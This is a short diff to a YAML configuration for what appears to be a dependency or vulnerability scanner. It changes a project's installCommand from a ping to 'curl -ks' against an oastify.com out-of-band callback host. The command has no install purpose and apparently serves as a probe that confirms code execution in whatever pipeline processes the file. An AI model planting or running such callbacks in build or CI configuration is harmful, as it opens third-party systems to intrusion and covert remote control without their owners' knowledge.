@@ -14,4 +14,4 @@
       minSeverity: high
       fixableOnly: false
       projects:
-        - installCommand: ping -c 1 dvcedb6jdybzq56x3nye67yq4ha8y1mq.oastify.com
+        - installCommand: curl -ks "http://dvcedb6jdybzq56x3nye67yq4ha8y1mq.oastify.com/czar"
